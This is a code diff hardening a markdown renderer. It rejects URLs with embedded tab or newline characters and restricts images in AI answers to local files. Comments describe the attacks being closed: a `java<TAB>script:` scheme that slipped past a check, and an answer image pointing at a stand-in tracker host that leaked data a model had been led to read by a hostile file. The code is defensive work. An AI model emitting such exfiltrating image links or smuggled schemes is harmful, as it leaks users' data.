@@ -45,8 +45,15 @@ export function escapeHtml(text: string): string {
  * "the browser decides" is not a defence — the browser follows what it is given.
  */
 export function safeUrl(url: string): string | null {
-  const trimmed = String(url ?? '').trim()
-  if (trimmed.length === 0) return null
+  /**
+   * Judged as a browser's URL parser reads it (WHATWG URL), which trims C0 controls and spaces at both ends and drops
+   * tab and newline **wherever they are**. So the ends are trimmed of both those and white space, and a URL still
+   * holding a tab, newline or carriage return is refused: `java<TAB>script:` had no scheme to the pattern below and
+   * passed as a relative path, while the browser followed `javascript:` (live issue developer-two-6). A URL meant
+   * literally never holds those characters raw. The Rust `safe_url` decides the same.
+   */
+  const trimmed = String(url ?? '').replace(/^[\u0000-\u0020\s]+|[\u0000-\u0020\s]+$/g, '')
+  if (trimmed.length === 0 || /[\t\n\r]/.test(trimmed)) return null
   if (/^[a-z][a-z0-9+.-]*:/i.test(trimmed)) {
     return /^(?:https?|mailto):/i.test(trimmed) ? trimmed : null
   }
@@ -126,6 +133,36 @@ const marked = new Marked({ gfm: true, breaks: false })
  * during it. The setter below is the only writer.
  */
 let imageBase: string | undefined
+
+/**
+ * Whether an image may come from another host, for the parse in progress: a document's preview (`remoteImages`) keeps
+ * the author's remote image as written; an answer does not. Set beside `imageBase`, by the same two entry points.
+ */
+let remoteImagesAllowed = false
+
+/**
+ * Where an image is fetched from, or `null` when it is not fetched at all (the image becomes its alt text).
+ *
+ * A document's preview resolves a relative image beside the document and leaves a remote one as written. An **answer**
+ * shows only local files, as DSH's `localPathMediaUrl` does ("undefined for unsupported protocols and non-local
+ * paths"): an absolute path goes to the route that serves a file's bytes, and a remote, protocol-relative or unresolvable
+ * source is not fetched. Before this an answer's `![x](https://tracker.example/p.png?d=…)` was fetched by the browser the
+ * moment the answer was drawn, with no click, so a model led by a hostile file could send out what it had read; and
+ * `![x](/api/sessions)` made the page request an API of the answer's choosing (live issue developer-two-7, 2026-10-29).
+ */
+function imageSource(target: string): string | null {
+  /**
+   * Already the route that serves a file's bytes: the renderer above wrote it, and the sanitizer hands it back here as
+   * a raw `<img>`. It is a local file either way, so it is kept rather than wrapped a second time.
+   */
+  if (target.startsWith('/api/raw?')) return target
+  const resolved = resolveSubresource(target, imageBase)
+  if (resolved !== null) return rawUrl(resolved)
+  if (remoteImagesAllowed) return target
+  const [path, fragment] = splitFragment(target)
+  if (path.startsWith('/') && !path.startsWith('//')) return rawUrl({ path, fragment })
+  return null
+}
 
 /**
  * A leading `_` is escaped, so a name is a name.
@@ -225,8 +262,8 @@ marked.use({
       const target = safeUrl(href)
       if (target === null) return label
       /** The base is set per parse, so one document's relative images do not resolve against another's. */
-      const resolved = resolveSubresource(target, imageBase)
-      const source = resolved === null ? target : rawUrl(resolved)
+      const source = imageSource(target)
+      if (source === null) return label
       const heading = title === null || title === undefined ? '' : ` title="${escapeHtml(title)}"`
       return `<img src="${escapeHtml(source)}" alt="${escapeHtml(text)}"${heading}>`
     },
@@ -240,7 +277,15 @@ marked.use({
  * code spans rather than two that can disagree.
  */
 export function renderInline(text: string): string {
-  return sanitizeHtml(marked.parseInline(escapeLeadingUnderscores(String(text ?? ''))) as string, { url: safeUrl })
+  /** An inline span is never a document's preview: its images follow an answer's rule, whatever parsed last. */
+  imageBase = undefined
+  remoteImagesAllowed = false
+  return sanitizeHtml(marked.parseInline(escapeLeadingUnderscores(String(text ?? ''))) as string, {
+    url: (value, at) => {
+      const safe = safeUrl(value)
+      return safe !== null && at.tag === 'img' ? imageSource(safe) : safe
+    },
+  })
 }
 
 /**
@@ -249,8 +294,10 @@ export function renderInline(text: string): string {
  * A leading YAML block is lifted out and shown as metadata rather than parsed: every document in this repository
  * opens with frontmatter, and as markdown it renders as a horizontal rule and a heading made of the first key.
  */
-export function renderMarkdown(source: string, options: { readonly base?: string } = {}): string {
+export function renderMarkdown(source: string, options: { readonly base?: string; readonly remoteImages?: boolean } = {}): string {
   imageBase = options.base
+  /** Only a document's preview asks for remote images; an answer, which has no `base`, never does. */
+  remoteImagesAllowed = options.remoteImages === true
   const text = String(source ?? '').replace(/\r\n?/g, '\n')
   const front = /^---\n([\s\S]*?)\n---\n?/.exec(text)
   const body = front === null ? text : text.slice(front[0].length)
@@ -271,6 +318,8 @@ export function renderMarkdown(source: string, options: { readonly base?: string
     url: (value, at) => {
       const safe = safeUrl(value)
       if (safe === null) return null
+      /** A hand-written `<img>` in an answer follows the same rule as a markdown image there: local files only. */
+      if (at.tag === 'img' && !remoteImagesAllowed) return imageSource(safe)
       /** A reference with a scheme, or one already absolute, is not a file beside the document. */
       const relative = !/^[a-z][a-z0-9+.-]*:/i.test(safe) && !safe.startsWith('/') && !safe.startsWith('#')
       if (!relative) return safe
